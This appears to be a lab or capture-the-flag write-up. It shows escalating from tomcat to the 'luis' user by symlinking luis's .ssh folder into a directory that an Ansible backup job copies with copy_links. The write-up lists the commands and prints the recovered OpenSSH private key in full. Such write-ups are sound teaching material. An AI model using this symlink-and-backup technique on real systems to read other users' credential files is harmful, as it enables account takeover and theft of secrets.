# Privilege escalation to `luis` user
## Discovered `run.yml` file using `pspy64`
Discovered `run.yml` being executed as argument to `/usr/bin/ansible-playbook` and `/usr/bin/ansible-playbook` is executed as `luis` user. 
![[Pasted image 20210928111324.png]]
## Discovered backup files in /opt/backups/archives directory seeing contents of run.yml file
Discovered backup files in /opt/backups/archives directory seeing contents of run.yml file.
```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
tomcat@seal:/opt/backups/playbook$ ls ../archives
ls ../archives
backup-2021-09-28-06:10:33.gz  backup-2021-09-28-06:13:33.gz
backup-2021-09-28-06:11:33.gz  backup-2021-09-28-06:14:33.gz
backup-2021-09-28-06:12:33.gz
tomcat@seal:/opt/backups/playbook$
```
## Seeing contents of /opt/backups/archives it is observerd that backups in .gz are made after every minute , so cronjob is scheduled to run every minute to make backups of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` directory every minute
Seeing contents of /opt/backups/archives it is observerd that backups in .gz are made after every minute , so cronjob is scheduled to run every minute to make backups of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` directory using some cronjob.
As it is evident from pspy64 program.
![[Pasted image 20210928112316.png]]
## Seeing contents of run.yml reveals that `copy_links=yes` is there which means that when content is copied from `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` , it also copies files/directories  that are linked with these directories like if `/home/luis/.ssh` is linked with  `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`etc.
Seeing contents of run.yml reveals that `copy_links=yes` is there which means that when content is copied from `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` , it also copies files/directories  that are linked with these directories like if `/home/luis/.ssh` is linked with  `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`etc.
![[Pasted image 20210928112811.png]]
Note that `var/lib/tomcat9/webapps/ROOT/admin/dashboard` also contains `uploads` folder with in it.
![[Pasted image 20210928113002.png]]
## Linking `/home/luis/.ssh` with `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`
Linking `/home/luis/.ssh` with `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads` , so that when ` /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml` command is run and contents of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads` are backed up in `.gz` format in `/opt/backups/archives`, files/directories linked with `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads` are also copied using command `ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`.
![[Pasted image 20210928113657.png]]
## Now waiting for cronjob to run so that we can grab private key of luis user found in `.gz`  backup file in `/opt/backups/archives`
![[Pasted image 20210928113940.png]]
## Copying `.gz` backup file to /tmp directory to extract its contents
![[Pasted image 20210928114041.png]]
## Grabbing id_rsa public key of luis user after extracting it `.gz` backup file contents
```bash
tomcat@seal:/opt/backups/archives$ cd /tmp
cd /tmp
tomcat@seal:/tmp$ ls
ls
backup-2021-09-28-06:37:33.gz  hsperfdata_tomcat  pspy64
tomcat@seal:/tmp$ gzip -d backup-2021-09-28-06:37:33.gz
gzip -d backup-2021-09-28-06:37:33.gz
tomcat@seal:/tmp$ ls
ls
backup-2021-09-28-06:37:33  hsperfdata_tomcat  pspy64
tomcat@seal:/tmp$ mv backup-2021-09-28-06:37:33  backup
mv backup-2021-09-28-06:37:33  backup
tomcat@seal:/tmp$ ls
ls
backup  hsperfdata_tomcat  pspy64
tomcat@seal:/tmp$ tar -xvf backup
tar -xvf backup
dashboard/
dashboard/scripts/
dashboard/images/
dashboard/css/
dashboard/uploads/
dashboard/bootstrap/
dashboard/index.html
dashboard/scripts/flot/
dashboard/scripts/datatables/
dashboard/scripts/jquery-ui-1.10.1.custom.min.js
dashboard/scripts/common.js
dashboard/scripts/jquery-1.9.1.min.js
dashboard/scripts/flot/jquery.flot.resize.js
dashboard/scripts/flot/jquery.flot.pie.js
dashboard/scripts/flot/jquery.flot.js
dashboard/scripts/datatables/jquery.dataTables.js
dashboard/images/jquery-ui/
dashboard/images/icons/
dashboard/images/img.jpg
dashboard/images/user.png
dashboard/images/bg.png
dashboard/images/jquery-ui/picker.png
dashboard/images/icons/css/
dashboard/images/icons/font/
dashboard/images/icons/css/font-awesome.css
dashboard/images/icons/font/fontawesome-webfont3294.ttf
dashboard/images/icons/font/fontawesome-webfontd41d.eot
dashboard/images/icons/font/fontawesome-webfont3294.eot
dashboard/images/icons/font/fontawesome-webfont3294.woff
dashboard/css/theme.css
dashboard/uploads/.ssh/
dashboard/uploads/.ssh/id_rsa
dashboard/uploads/.ssh/id_rsa.pub
dashboard/uploads/.ssh/authorized_keys
dashboard/bootstrap/css/
dashboard/bootstrap/js/
dashboard/bootstrap/img/
dashboard/bootstrap/css/bootstrap-responsive.min.css
dashboard/bootstrap/css/bootstrap.min.css
dashboard/bootstrap/js/bootstrap.min.js
dashboard/bootstrap/img/glyphicons-halflings.png
dashboard/bootstrap/img/glyphicons-halflings-white.png
tomcat@seal:/tmp$
```
![[Pasted image 20210928114558.png]]
## id_rsa private key of `luis` user 
```bash
tomcat@seal:/tmp/dashboard/uploads/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
tomcat@seal:/tmp/dashboard/uploads/.ssh$
```


